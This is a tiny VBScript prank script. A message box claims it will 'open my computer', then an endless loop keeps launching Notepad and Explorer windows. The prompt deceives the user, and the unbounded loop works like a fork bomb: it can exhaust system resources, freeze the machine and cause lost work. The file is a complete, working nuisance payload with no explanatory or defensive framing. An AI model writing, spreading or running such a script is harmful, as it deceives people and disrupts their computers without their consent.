msgbox "Press OK to open my computer"
do
Set shell=CreateObject("wscript.shell")
Shell.Run("notepad.exe")
Shell.Run("explorer.exe")
loop